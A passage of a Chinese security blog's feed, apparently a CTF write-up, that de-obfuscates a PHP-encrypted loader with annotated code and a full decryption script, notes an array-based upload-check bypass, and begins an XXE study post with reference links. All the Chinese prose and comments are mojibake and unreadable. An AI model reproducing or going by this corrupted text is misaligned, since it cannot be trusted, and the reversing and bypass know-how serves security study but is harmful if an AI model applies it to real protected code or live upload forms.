è¿™ä¸ªå‡½æ•°çš„å‰åŠéƒ¨åˆ†æ˜¯é˜²æ­¢è°ƒè¯•</span></span><br><span class="line">        <span class="comment">// ååŠéƒ¨åˆ†æ˜¯æå–åé¢åŠ å¯†çš„ä»£ç </span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">func3</span><span class="params">($arg1)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">global</span> $_v1, <span class="comment">// $_v1 = 'file_get_contents';</span></span><br><span class="line">            $_v3, <span class="comment">// $_v3 = 'substr';</span></span><br><span class="line">            $_v4, <span class="comment">// $_v4 = 'assert';</span></span><br><span class="line">            $_v5, <span class="comment">// $_v5 = 'assert_options';</span></span><br><span class="line">            $_v6, <span class="comment">// $_v6 = 'unpack';</span></span><br><span class="line">            $_v7, <span class="comment">// $_v7 = 'constant';</span></span><br><span class="line">            $_v8, <span class="comment">// $_v8 = 'preg_replace';</span></span><br><span class="line">            $_v9, <span class="comment">// $_v9 = 'base64_encode';</span></span><br><span class="line">            $_v10, <span class="comment">// $_v10 = 'gzuncompress';</span></span><br><span class="line">            $_v11, <span class="comment">// $_v11 = 'create_function';</span></span><br><span class="line">            $_v12, <span class="comment">// $_v12 = 'strpos';</span></span><br><span class="line">            $_v13, <span class="comment">// $_v13 = 'addslashes';</span></span><br><span class="line">            $_v14, <span class="comment">// $_v14 = 'str_rot13';</span></span><br><span class="line">            $_v15, <span class="comment">// $_v15 = 'md5';</span></span><br><span class="line">            $_v16, <span class="comment">// $_v16 = 'set_include_path';</span></span><br><span class="line">            $_v17; <span class="comment">// $_v17 = 'dirname';</span></span><br><span class="line">            <span class="comment">// è¿™é‡Œæœ‰ä¸€å †å˜é‡ç­‰äº func4ï¼Œç„¶åç”¨ä»–ä»¬è§£ç å¾—åˆ° $v1 - $v5</span></span><br><span class="line">            $v1 = <span class="string">'php_sapi_name'</span>;</span><br><span class="line">            $v2 = <span class="string">'die'</span>;</span><br><span class="line">            $v3 = <span class="string">'cli'</span>;</span><br><span class="line">            $v4 = <span class="string">'microtime'</span>;</span><br><span class="line">            $v5 = <span class="string">'1000'</span>;</span><br><span class="line">            <span class="comment">// $v1() == $v3 ? $v2() : '';</span></span><br><span class="line">            <span class="comment">// è¿™å¥è¯åœ¨è°ƒè¯•çš„æ—¶å€™éœ€è¦æ³¨é‡Šæ‰</span></span><br><span class="line">            php_sapi_name() == <span class="string">'cli'</span> ? <span class="keyword">die</span>() : <span class="string">''</span>;</span><br><span class="line">            <span class="comment">// file_get_contents(constant(func4('??????')));</span></span><br><span class="line">            $v7 = file_get_contents(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="comment">// $v8 = $v4(true) * $v5;</span></span><br><span class="line">            $v8 = microtime(<span class="keyword">true</span>) * <span class="number">1000</span>;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">""</span>);</span><br><span class="line">            <span class="comment">// if ($v4(true) * $v5 - $v8 &gt; 100) &#123;</span></span><br><span class="line">            <span class="comment">// è¿™é‡Œæ˜¯é˜²æ­¢ä¸‹æ–­ç‚¹è°ƒè¯•çš„ï¼Œä¸‹æ–­ç‚¹è°ƒè¯•ï¼Œè¿™é‡Œå°±è¶…è¿‡ 100 æ¯«ç§’äº†ï¼Œç›´æ¥æ³¨é‡Šæ‰</span></span><br><span class="line">            <span class="keyword">if</span> (microtime(<span class="keyword">true</span>) * <span class="number">1000</span> - $v8 &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="comment">// $v2();</span></span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// eval(func4('??????'));</span></span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">'if(strpos(__FILE__, msvigqgq) !== 0)&#123;$exitfunc();&#125;'</span>);</span><br><span class="line">            <span class="comment">// $_v12(func4($_v3($v7, func4('??????'), func4('??????'))), $_v15($_v3($v7, func4('??????'), func4('??????')))) ? $v9() : $v10;</span></span><br><span class="line">            <span class="comment">// è¿™é‡Œçš„ $v9 å’Œ $v10 éƒ½æ²¡æœ‰å®šä¹‰ï¼Œå¦‚æœéªŒè¯å¤±è´¥ï¼Œå°±ä¼šè°ƒç”¨ $v9 ä¼šç›´æ¥å‡ºé”™é€€å‡ºç¨‹åº</span></span><br><span class="line">            <span class="comment">// è€Œå¦‚æœéªŒè¯æˆåŠŸ $v10 å˜é‡ä¸å­˜åœ¨åˆ™æ²¡é—®é¢˜</span></span><br><span class="line">            <span class="comment">// éªŒè¯æ–¹æ³•å°±æ˜¯æŠŠæ–‡ä»¶å°¾éƒ¨åˆ†è§£å¯†å’Œå‰é¢çš„æ–‡ä»¶ä¸»ä½“éƒ¨åˆ†çš„md5å¯¹æ¯”ï¼Œç›´æ¥æ³¨é‡Šæ‰</span></span><br><span class="line">            !strpos(func4(substr($v7, <span class="number">-45</span>, <span class="number">-1</span>)), md5(substr($v7, <span class="number">0</span>, <span class="number">-46</span>))) ? $v9() : $v10;</span><br><span class="line">            <span class="comment">// è¿™ä¸¤ä¸ªæ•°å€¼æ˜¯é€šè¿‡ func4 è§£ç å¾—åˆ°çš„</span></span><br><span class="line">            $v11 = <span class="string">'-2586'</span>;</span><br><span class="line">            $v12 = <span class="string">'-46'</span>;</span><br><span class="line">            <span class="comment">// $v12 = $_v14(@$_v10(func4(substr($v7, $v11, $v12))));</span></span><br><span class="line">            $v12 = str_rot13(@gzuncompress(func4(substr($v7, $v11, $v12))));</span><br><span class="line">            <span class="keyword">return</span> $v12;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç¬¬å››ä¸ªå‡½æ•°æœ‰ç‚¹å¤æ‚ï¼Œè¿™æ˜¯ä¸€ä¸ªè§£ç å‡½æ•°ï¼Œç”¨çš„æ˜¯å¼‚æˆ–ç®—æ³•è§£å¯†ï¼Œæ‰€æœ‰è°ƒç”¨ func4 çš„ä½ç½®éƒ½æ²¡æœ‰æä¾› $arg2</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">func4</span><span class="params">($arg1, $arg2 = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $v1 = <span class="string">'base64_decode'</span>;</span><br><span class="line">            <span class="comment">// $v2 - $v4 é€šè¿‡ base64_decode è§£ç å¾—åˆ°</span></span><br><span class="line">            $v2 = <span class="string">'ord'</span>;</span><br><span class="line">            $v3 = <span class="string">'strlen'</span>;</span><br><span class="line">            $v4 = <span class="string">'chr'</span>;</span><br><span class="line">            <span class="comment">// $arg2 = !$arg2 ? $v2('?') : $arg2;</span></span><br><span class="line">            <span class="comment">// $arg2 = !$arg2 ? 136 : $arg2;</span></span><br><span class="line">            $arg2 = <span class="number">136</span>;</span><br><span class="line">            <span class="comment">// è¿™é‡Œ $v5 ä¸å­˜åœ¨ï¼Œæ‰€ä»¥ $v6 = null;</span></span><br><span class="line">            $v6 = $v5;</span><br><span class="line">            <span class="comment">// for (; $v6 &lt; $v3($arg1); $v6++) &#123;</span></span><br><span class="line">            <span class="keyword">for</span> (; $v6 &lt; strlen($arg1); $v6++) &#123;</span><br><span class="line">                <span class="comment">// $v7 .= $v2($arg1[$v6]) &lt; $v2('?') ? $v2($arg1[$v6]) &gt; $arg2 &amp;&amp; $v2($arg1[$v6]) &lt; 245 ? $v4($v2($arg1[$v6]) / 2) : $arg1[$v6] : '';</span></span><br><span class="line">                $v7 .= ord($arg1[$v6]) &lt; <span class="number">245</span> ? ord($arg1[$v6]) &gt; $arg2 &amp;&amp; ord($arg1[$v6]) &lt; <span class="number">245</span> ? chr(ord($arg1[$v6]) / <span class="number">2</span>) : $arg1[$v6] : <span class="string">''</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// $v8 = $v1($v7);</span></span><br><span class="line">            $v8 = base64_decode($v7);</span><br><span class="line">            $v9 = <span class="string">'md5'</span>; <span class="comment">// $v9 é€šè¿‡ base64_decode è§£ç å¾—åˆ°</span></span><br><span class="line">            $v6 = $v5;</span><br><span class="line">            <span class="comment">// $arg2 = $v9('8_Q.L2');</span></span><br><span class="line">            <span class="comment">// $arg2 = md5('8_Q.L2');</span></span><br><span class="line">            $arg2 = <span class="string">'fac02565267d815643cecee75a16c7bd'</span>;</span><br><span class="line">            <span class="comment">// $v10 = $ctrmax = $v3($arg2);</span></span><br><span class="line">            <span class="comment">// $v10 = $ctrmax = strlen($arg2);</span></span><br><span class="line">            $v10 = $ctrmax = <span class="number">32</span>;</span><br><span class="line">            <span class="comment">// for (; $v6 &lt; $v3($v8); $v6++) &#123;</span></span><br><span class="line">            <span class="keyword">for</span> (; $v6 &lt; strlen($v8); $v6++) &#123;</span><br><span class="line">                $v10 = $v10 ? $v10 : $ctrmax;</span><br><span class="line">                $v10--;</span><br><span class="line">                $v11 .= $v8[$v6] ^ $arg2[$v10];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $v11;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> $_v1, <span class="comment">// $_v1 = 'file_get_contents';</span></span><br><span class="line">$_v2, <span class="comment">// $_v2 = 'chr';</span></span><br><span class="line">$_v3, <span class="comment">// $_v3 = 'substr';</span></span><br><span class="line">$_v4, <span class="comment">// $_v4 = 'assert';</span></span><br><span class="line">$_v5, <span class="comment">// $_v5 = 'assert_options';</span></span><br><span class="line">$_v6, <span class="comment">// $_v6 = 'unpack';</span></span><br><span class="line">$_v7, <span class="comment">// $_v7 = 'constant';</span></span><br><span class="line">$_v8, <span class="comment">// $_v8 = 'preg_replace';</span></span><br><span class="line">$_v9, <span class="comment">// $_v9 = 'base64_encode';</span></span><br><span class="line">$_v10, <span class="comment">// $_v10 = 'gzuncompress';</span></span><br><span class="line">$_v11, <span class="comment">// $_v11 = 'create_function';</span></span><br><span class="line">$_v12, <span class="comment">// $_v12 = 'strpos';</span></span><br><span class="line">$_v13, <span class="comment">// $_v13 = 'addslashes';</span></span><br><span class="line">$_v14, <span class="comment">// $_v14 = 'str_rot13';</span></span><br><span class="line">$_v15, <span class="comment">// $_v15 = 'md5';</span></span><br><span class="line">$_v16, <span class="comment">// $_v16 = 'set_include_path';</span></span><br><span class="line">$_v17; <span class="comment">// $_v17 = 'dirname';</span></span><br><span class="line"><span class="comment">// ç„¶åä¸€å †å˜é‡ç­‰äº func2</span></span><br><span class="line"><span class="keyword">if</span> (!$_v1) &#123;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ func2 ç”¨ä¼ é€’å¼•ç”¨å˜é‡çš„æ–¹æ³•èµ‹å€¼ï¼Œç®€åŒ–ä¹‹åå¦‚ä¸‹</span></span><br><span class="line">    $_v1 = <span class="string">'file_get_contents'</span>;</span><br><span class="line">    $_v3 = <span class="string">'substr'</span>;</span><br><span class="line">    $_v6 = <span class="string">'unpack'</span>;</span><br><span class="line">    $_v10 = <span class="string">'gzuncompress'</span>;</span><br><span class="line">    $_v11 = <span class="string">'create_function'</span>;</span><br><span class="line">    $_v12 = <span class="string">'strpos'</span>;</span><br><span class="line">    $_v13 = <span class="string">'addslashes'</span>;</span><br><span class="line">    $_v14 = <span class="string">'str_rot13'</span>;</span><br><span class="line">    $_v15 = <span class="string">'md5'</span>;</span><br><span class="line">    $_v16 = <span class="string">'set_include_path'</span>;</span><br><span class="line">    $_v17 = <span class="string">'dirname'</span>;</span><br><span class="line">    $_v8 = <span class="string">'preg_replace'</span>;</span><br><span class="line">    $_v9 = <span class="string">'base64_encode'</span>;</span><br><span class="line">    $_v7 = <span class="string">'constant'</span>;</span><br><span class="line">    $_v5 = <span class="string">'assert_options'</span>;</span><br><span class="line">    $_v4 = <span class="string">'assert'</span>;</span><br><span class="line">    $_v2 = <span class="string">'chr'</span>;</span><br><span class="line">    $v1 = <span class="string">'rand'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ä¸€å †å˜é‡ç­‰äº func4ï¼Œç„¶åç”¨ func4 è§£ç </span></span><br><span class="line">$v2 = <span class="string">'_f_'</span>;</span><br><span class="line">$v3 = func3($&#123;$v2&#125;);</span><br><span class="line"><span class="comment">// $_v16($_v17($&#123;$v2&#125;));</span></span><br><span class="line">set_include_path(dirname($&#123;$v2&#125;));</span><br><span class="line"><span class="comment">// $v4 = $_v9($v3);</span></span><br><span class="line">$v4 = base64_encode($v3);</span><br><span class="line"><span class="comment">// $v5 = func4('??????');</span></span><br><span class="line"><span class="comment">// è§£å¯†ä¹‹åçš„åŸæ–‡ä¸æ˜¯ $v4ï¼Œè¿™é‡Œæ˜¯ç¿»è¯‘ä¹‹åçš„</span></span><br><span class="line">$v5 = <span class="string">'eval(base64_decode($v4));'</span>;</span><br><span class="line"><span class="comment">// $v5 = $_v8(func4('??????'), $v5, func4('??????'));</span></span><br><span class="line"><span class="comment">// mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</span></span><br><span class="line"><span class="comment">// PCRE ä¿®é¥°ç¬¦ e (PREG_REPLACE_EVAL)</span></span><br><span class="line"><span class="comment">// Warning: This feature was DEPRECATED in PHP 5.5.0, and REMOVED as of PHP 7.0.0.</span></span><br><span class="line"><span class="comment">// If this deprecated modifier is set, preg_replace() does normal substitution of backreferences in the replacement string, evaluates it as PHP code, and uses the result for replacing the search string. Single quotes, double quotes, backslashes (\) and NULL chars will be escaped by backslashes in substituted backreferences.</span></span><br><span class="line"><span class="comment">// æ¢å¥è¯è¯´ preg_replace å¦‚æœå¸¦ e çš„è¯ï¼Œç¬¬ä¸€æ­¥ï¼Œæ­£å¸¸åœ°è¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼æ›¿æ¢ï¼ˆåå‘å¼•ç”¨ä¹Ÿä¼šè¢«æ­£å¸¸æ›¿æ¢ï¼Œå°±æ˜¯å®Œå…¨æ­£å¸¸çš„æ­£åˆ™æ›¿æ¢ï¼‰ï¼Œç¬¬äºŒæ­¥ï¼ŒæŠŠç»“æœ eval ä½œä¸ºæœ€ç»ˆç»“æœ</span></span><br><span class="line"><span class="comment">// ç®€è€Œè¨€ä¹‹ $v5 = eval($v5);</span></span><br><span class="line">$v5 = preg_replace(<span class="string">'/0dcaf9/e'</span>, $v5, <span class="string">'0dcaf9'</span>);</span><br><span class="line"><span class="comment">// æŠŠä¸Šè¿°å‡ æ­¥ç»Ÿä¸€ä¸€ä¸‹ $v5 = eval(func3($_f_));</span></span><br><span class="line"><span class="comment">// $_v16($_v17($&#123;$v2&#125;));</span></span><br><span class="line">set_include_path(dirname($&#123;$v2&#125;));</span><br><span class="line"><span class="comment">// æŠŠè§£ç ä¹‹åçš„æ–‡ä»¶è¿è¡Œç»“æœè¿”å›</span></span><br><span class="line"><span class="keyword">return</span> $v5;</span><br></pre></td></tr></table></figure></div><h3 id="è§£ç "><a href="#è§£ç " class="headerlink" title="è§£ç "></a>è§£ç </h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($data, $key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data_1 = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($data); $i++) &#123;</span><br><span class="line">        $ch = ord($data[$i]);</span><br><span class="line">        <span class="keyword">if</span> ($ch &lt; <span class="number">245</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($ch &gt; <span class="number">136</span>) &#123;</span><br><span class="line">                $data_1 .= chr($ch / <span class="number">2</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $data_1 .= $data[$i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $data_1 = base64_decode($data_1);</span><br><span class="line">    $key = md5($key);</span><br><span class="line">    $j = $ctrmax = <span class="number">32</span>;</span><br><span class="line">    $data_2 = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($data_1); $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($j &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            $j = $ctrmax;</span><br><span class="line">        &#125;</span><br><span class="line">        $j--;</span><br><span class="line">        $data_2 .=  $data_1[$i] ^ $key[$j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $data_2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find_data</span><span class="params">($code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $code_end = strrpos($code, <span class="string">'?&gt;'</span>);</span><br><span class="line">    <span class="keyword">if</span> (!$code_end) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $data_start = $code_end + <span class="number">2</span>;</span><br><span class="line">    $data = substr($code, $data_start, <span class="number">-46</span>);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find_key</span><span class="params">($code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// $v1 = $v2('bWQ1');</span></span><br><span class="line">    <span class="comment">// $key1 = $v1('??????');</span></span><br><span class="line">    $pos1 = strpos($code, <span class="string">"('"</span> . preg_quote(base64_encode(<span class="string">'md5'</span>)) . <span class="string">"');"</span>);</span><br><span class="line">    $pos2 = strrpos(substr($code, <span class="number">0</span>, $pos1), <span class="string">'$'</span>);</span><br><span class="line">    $pos3 = strrpos(substr($code, <span class="number">0</span>, $pos2), <span class="string">'$'</span>);</span><br><span class="line">    $var_name = substr($code, $pos3, $pos2 - $pos3 - <span class="number">1</span>);</span><br><span class="line">    $pos4 = strpos($code, $var_name, $pos1);</span><br><span class="line">    $pos5 = strpos($code, <span class="string">"('"</span>, $pos4);</span><br><span class="line">    $pos6 = strpos($code, <span class="string">"')"</span>, $pos4);</span><br><span class="line">    $key = substr($code, $pos5 + <span class="number">2</span>, $pos6 - $pos5 - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> $key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$input_file = $argv[<span class="number">1</span>];</span><br><span class="line">$output_file = $argv[<span class="number">1</span>] . <span class="string">'.decrypted.php'</span>;</span><br><span class="line"></span><br><span class="line">$code = file_get_contents($input_file);</span><br><span class="line"></span><br><span class="line">$data = find_data($code);</span><br><span class="line"><span class="keyword">if</span> (!$code) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'æœªæ‰¾åˆ°åŠ å¯†æ•°æ®'</span>, PHP_EOL;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key = find_key($code);</span><br><span class="line"><span class="keyword">if</span> (!$key) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'æœªæ‰¾åˆ°ç§˜é’¥'</span>, PHP_EOL;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$decrypted = decrypt($data, $key);</span><br><span class="line">$uncompressed = gzuncompress($decrypted);</span><br><span class="line"><span class="comment">// ç”±äºå¯ä»¥ä¸å‹¾é€‰ä»£ç å‹ç¼©çš„é€‰é¡¹ï¼Œæ‰€ä»¥è¿™é‡Œåˆ¤æ–­ä¸€ä¸‹æ˜¯å¦è§£å‹æˆåŠŸï¼Œè§£å‹å¤±è´¥å°±æ˜¯æ²¡å‹ç¼©</span></span><br><span class="line"><span class="keyword">if</span> ($uncompressed) &#123;</span><br><span class="line">    $decrypted = str_rot13($uncompressed);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $decrypted = str_rot13($decrypted);</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($output_file, $decrypted);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'è§£å¯†åæ–‡ä»¶å·²å†™å…¥åˆ° '</span>, $output_file, PHP_EOL;</span><br></pre></td></tr></table></figure></div><h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><p>æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œ<code>index.php</code> æç¤ºå­˜åœ¨ <code>UploadFile.class.php</code>ï¼Œä¸‹è½½ä¸‹æ¥ä¹‹åï¼Œå‘ç°å…³é”®å‡½æ•°ï¼Œç„¶åæ•°ç»„ç»•è¿‡å°±vansäº†</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"> <span class="comment">// ç”¨.åˆ†å‰²æ–‡ä»¶åï¼Œåªä¿ç•™é¦–å°¾ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œé˜²å¾¡Apacheè§£ææ¼æ´</span></span><br><span class="line">    $origin_name = current($filename);</span><br><span class="line">    $ext = end($filename);</span><br><span class="line">    $new_name = (<span class="keyword">$this</span>-&gt;new_name ? <span class="keyword">$this</span>-&gt;new_name : $origin_name) . <span class="string">'.'</span> . $ext;</span><br><span class="line">    $target_fullpath = <span class="keyword">$this</span>-&gt;dist_path . DIRECTORY_SEPARATOR . $new_name;</span><br></pre></td></tr></table></figure></div><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://www.virzz.com/2017/09/20/pwnhub_writeups_sha_fu_fu_workdays.html" target="_blank" rel="noopener">Virinkå¸ˆå‚…çš„é¢˜è§£</a><br><a href="https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html" target="_blank" rel="noopener">pç¥çš„å‡ºé¢˜åŸç†</a><br><a href="http://lovei.org/archives/pwnhub6669.html" target="_blank" rel="noopener">è…¹é»‘å¸ˆå‚…çš„wp</a><br><a href="https://www.52pojie.cn/thread-693641-1-1.html" target="_blank" rel="noopener">Ganlv å¸ˆå‚…çš„è§£ç æ€è·¯</a><br><a href="https://www.colabug.com/2018/0209/2334241/" target="_blank" rel="noopener">æŸPHPåŠ å¯†æ–‡ä»¶è§£å¯†è¿‡ç¨‹åˆæ¢</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\yakko117\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\yakko117\assets\js\A
      
    
    </summary>
    
    
      <category term="å­¦ä¹ ç¬”è®°" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="php" scheme="https://manayakko.github.io/yakko117/tags/php/"/>
    
      <category term="code audit" scheme="https://manayakko.github.io/yakko117/tags/code-audit/"/>
    
  </entry>
  
  <entry>
    <title>XXEæ¼æ´å­¦ä¹ </title>
    <link href="https://manayakko.github.io/yakko117/2020/03/18/XXElearn/"/>
    <id>https://manayakko.github.io/yakko117/2020/03/18/XXElearn/</id>
    <published>2020-03-18T12:28:17.262Z</published>
    <updated>2020-03-20T02:06:00.373Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>æœ€è¿‘è«åå¼€å§‹å€’æ—¶å·®ï¼Œæ¯å¤©ä¸‹åˆ5ç‚¹å¤šå¼€å§‹çŠ¯å›°ï¼Œç„¶åä¸€ç¡å°±ç¡åˆ°äº†åŠå¤œèµ·æ¥<br>åªä¼šåšé¢˜æ˜¯ä¸è¡Œçš„ï¼Œè¦å»å­¦ä¹ åŸç†ï¼Œè€Œä¸æ˜¯çº¯ç²¹åšä¸ªè„šæœ¬å°å­</p><a id="more"></a><h1 id="åŸºç¡€çŸ¥è¯†å‚è€ƒæ–‡æ¡£"><a href="#åŸºç¡€çŸ¥è¯†å‚è€ƒæ–‡æ¡£" class="headerlink" title="åŸºç¡€çŸ¥è¯†å‚è€ƒæ–‡æ¡£"></a>åŸºç¡€çŸ¥è¯†å‚è€ƒæ–‡æ¡£</h1><p><a href="https://www.tutorialspoint.com/dtd/dtd_entities.htm" target="_blank" rel="noopener">XMLç±»å‹å£°æ˜åŸæ–‡æ¡£</a><br><a href="https://www.cnblogs.com/zhaijiahui/p/9147595.html" target="_blank" rel="noopener">XXEæ¼æ´å­¦ä¹ </a><br><a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">XXEæ¼æ´åˆ©ç”¨æŠ€å·§ï¼šä»XMLåˆ°è¿œç¨‹ä»£ç æ‰§è¡Œ</a><br><a href="https://zhuanlan.zhihu.com/p/88125925" target="_blank" rel="noopener">googleCTF2019å…³äºxxeçš„é¢˜è§£</a><br><a href="https://blog.zsec.uk/blind-xxe-learning/" target="_blank" rel="noopener">ç›²æ³¨æŠ€å·§</a><br><a href="https://xz.aliyun.com/t/6829" target="_blank" rel="noopener">PHPä¸JAVAä¹‹XXEæ¼æ´è¯¦è§£ä¸å®¡è®¡</a></p><h1 id="å‡ ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹"><a href="#å‡ ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹" class="headerlink" title="å‡ ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹"></a>å‡ ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹</h1><p>ç°åœ¨æœ‰<code>å›æ˜¾çš„XXE</code> å·²ç»å¾ˆå°‘äº†,Blind-XXEé‡ç‚¹åœ¨äºå¦‚ä½•å°†æ•°æ®ä¼ è¾“å‡ºæ¥ã€‚</p><p>ä»¥å¾€å¾ˆå¤šæ–‡ç« é€šè¿‡å¼•å…¥å¤–éƒ¨æœåŠ¡å™¨æˆ–å¤–éƒ¨dtdæ–‡ä»¶,å¯ä»¥å®ç° <code>OOB(out-of-band)</code> ä¿¡æ¯ä¼ é€’å’Œé€šè¿‡æ„é€ dtdä»é”™è¯¯ä¿¡æ¯è·å–æ•°æ®ã€‚</p><h2 id="è®°å¾—æ”¹"><a href="#è®°å¾—æ”¹" class="headerlink" title="è®°å¾—æ”¹"></a>è®°å¾—æ”¹</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-type</span>: application/xml</span><br></pre></td></tr></table></figure></div><h2 id="åˆ©ç”¨åè®®"><a href="#åˆ©ç”¨åè®®" class="headerlink" title="åˆ©ç”¨åè®®"></a>åˆ©ç”¨åè®®</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/xml_1.png" data-fancybox="group" data-caption="pro" class="fancybox"><img alt="pro" title="pro" 